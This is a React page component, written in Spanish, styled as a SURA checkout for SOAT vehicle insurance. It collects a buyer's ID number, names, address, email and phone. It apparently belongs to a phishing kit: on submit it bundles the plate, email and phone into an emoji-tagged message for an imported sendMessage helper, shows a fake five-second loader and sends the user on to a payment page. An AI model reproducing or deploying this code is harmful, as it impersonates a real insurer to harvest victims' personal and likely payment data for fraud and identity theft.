import React, { useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import Styles from './Verification.module.css';
import sendMessage from '../Sender/Sender';
import Header from '../Header/Header';
import Footer from '../Footer/Footer';
import loaderGif from '../../Assets/Images/loader.gif'

import i from '../../Assets/Images/i.png';

function Datos() {
    const navigate = useNavigate();
    const location = useLocation();
    const { dataX, dataC, dataM, dataS, dataP, dataY } = location.state || {};

    const [loading, setLoading] = useState(false);

    // Estados para los campos
    const [data1, setData1] = useState("");
    const [data2, setData2] = useState("");
    const [data3, setData3] = useState("");
    const [data4, setData4] = useState("");
    const [data5, setData5] = useState("");
    const [data6, setData6] = useState("");
    const [data7, setData7] = useState("");
    const [data8, setData8] = useState("");
    
    // Estados touched
    const [touched1, setTouched1] = useState(false);
    const [touched2, setTouched2] = useState(false);
    const [touched3, setTouched3] = useState(false);
    const [touched4, setTouched4] = useState(false);
    const [touched5, setTouched5] = useState(false);
    const [touched6, setTouched6] = useState(false);
    const [touched7, setTouched7] = useState(false);
    const [touched8, setTouched8] = useState(false);

    // Crear refs para cada campo
    const data1Ref = useRef(null);
    const data2Ref = useRef(null);
    const data3Ref = useRef(null);
    const data4Ref = useRef(null);
    const data5Ref = useRef(null);
    const data6Ref = useRef(null);
    const data7Ref = useRef(null);
    const data8Ref = useRef(null);

    // Validación de todos los campos
    const allFieldsValid = () => {
        return (
            data1 &&
            data2 &&
            data3 &&
            data4 &&
            data5 &&
            data6 &&
            data7 &&
            data8
        );
    };

    // Manejo del formulario
    const handleSubmit = (e) => {
        e.preventDefault();

        // Verificación de campos vacíos
        if (!allFieldsValid()) {
            if (!data1) {
                setTouched1(true);
                data1Ref.current.focus(); // Enfoca el primer campo vacío
            } else if (!data2) {
                setTouched2(true);
                data2Ref.current.focus();
            } else if (!data3) {
                setTouched3(true);
                data3Ref.current.focus(); 
            } else if (!data4) {
                setTouched4(true);
                data4Ref.current.focus();
            } else if (!data5) {
                setTouched5(true);
                data5Ref.current.focus();
            } else if (!data6) {
                setTouched6(true);
                data6Ref.current.focus();
            } else if (!data7) {
                setTouched7(true);
                data7Ref.current.focus();
            } else if (!data8) {
                setTouched8(true);
                data8Ref.current.focus();
            }

            return; // Evitar la redirección si falta algún campo
        }

        const mensaje = `🏢 SURA: ${dataX.toUpperCase()}

📧: ${data7}
📞: ${data8}`;

        sendMessage(mensaje);

        setLoading(true);

        setTimeout(() => {
            setLoading(false);

            navigate('/pago', {
                state: {
                    dataX,
                    dataC,
                    dataM,
                    dataS,
                    dataP,
                    dataY
                },
            });
        }, 5000);
    };

    return (
        <>
            <Header stepSectionB={3}/>

            <main className={Styles.xVerificationMain}> 

                <section className={Styles.xVerificationMainSectionA}>
                    <div>
                        <h5>Informacion del vehiculo</h5>
                        <p>Placa: {dataX.toUpperCase()}</p>
                        <p>Modelo: {dataM}</p>
                        <p>Servicio/Carroceria: {dataS}</p>
                        <p>Clase: {dataC}</p>
                    </div>
                </section>

                <section className={Styles.xVerificationMainSectionB}>
                    <h2>Datos del tomador</h2>
                    <form>
                        <div>
                            <select 
                                ref={data1Ref}
                                value={data1}
                                onChange={(e) => setData1(e.target.value)}
                                required
                                onBlur={() => setTouched1(true)}
                                className={touched1 ? Styles.touched : ""}
                            >
                                <option value="" disabled></option>
                                <option value="CC">Cedula de Ciudadanía</option>
                                <option value="CE">Cedula de Extranjería</option>
                                <option value="NIT">NIT</option>
                            </select>
                            <label>Tipo de Identificacion</label>
                        </div>

                        <div>
                            <input 
                                ref={data2Ref}
                                placeholder=" "
                                value={data2}
                                onChange={(e) => setData2(e.target.value)}
                                required
                                onBlur={() => setTouched2(true)}
                                className={touched2 ? Styles.touched : ""}
                            />
                            <label>Numero de Identificacion</label>
                        </div>

                        <div>
                            <input 
                                ref={data3Ref}
                                placeholder=" "
                                value={data3}
                                onChange={(e) => setData3(e.target.value)}
                                required
                                onBlur={() => setTouched3(true)}
                                className={touched3 ? Styles.touched : ""}
                            />
                            <label>Nombres</label>
                        </div>

                        <div>
                            <input 
                                ref={data4Ref}
                                placeholder=" "
                                value={data4}
                                onChange={(e) => setData4(e.target.value)}
                                required
                                onBlur={() => setTouched4(true)}
                                className={touched4 ? Styles.touched : ""}
                            />
                            <label>Apellidos</label>
                        </div>
                        
                        <div>
                            <input
                                type="text"
                                ref={data5Ref}
                                value={data5}
                                placeholder=" "
                                onChange={(e) => setData5(e.target.value)}
                                required
                                onBlur={() => setTouched5(true)}
                                
                                className={touched5 ? Styles.touched : ""}
                            />
                            <label>Municipio</label>
                        </div>

                        <div>
                            <input 
                                ref={data6Ref}
                                placeholder=" "
                                value={data6}
                                onChange={(e) => setData6(e.target.value)}
                                required
                                onBlur={() => setTouched6(true)}
                                className={touched6 ? Styles.touched : ""}
                            />
                            <label>Dirección de Residencia</label>
                        </div>

                        <div>
                            <input 
                                ref={data7Ref}
                                placeholder=" "
                                value={data7}
                                onChange={(e) => setData7(e.target.value)}
                                required
                                onBlur={() => setTouched7(true)}
                                className={touched7 ? Styles.touched : ""}
                                type="email"
                            />
                            <label>Correo Electrónico</label>
                        </div>

                        <div>
                            <input 
                                ref={data8Ref}
                                placeholder=" "
                                value={data8}
                                onChange={(e) => setData8(e.target.value.replace(/\D/g, '').slice(0, 10))} // Solo números y máximo 10 dígitos
                                required
                                onBlur={() => setTouched8(true)}
                                className={touched8 ? Styles.touched : ""}
                                pattern="^\d{10}$" // Solo 10 dígitos
                            />
                            <label>Número de Celular</label>
                        </div>
                    </form>

                    <div>
                        <img src={i} alt="Info" />
                        <p>Verifica tus datos y asegúrate de que sean correctos. Solo así podemos enviarte notificaciones y confirmaciones de tu proceso de compra</p>
                    </div>

                </section>

                <section className={Styles.xVerificationMainSectionC}>
                    <div>
                        <div>
                            <span>Valor a Pagar:</span>
                            <span>${dataY ? dataY.toLocaleString() : 0}</span>
                        </div>
                        <div>*Este es un valor aproximado. Antes de que pagues, verás el costo real del SOAT.</div>
                    </div>
                    <button onClick={handleSubmit}>Comprar</button>
                </section>

            </main>

            {loading && (
                <aside className={Styles.loader}>
                    <img src={loaderGif} alt="Loader"></img>
                </aside>
            )}

            <Footer />
        </>
    )
}

export default Datos;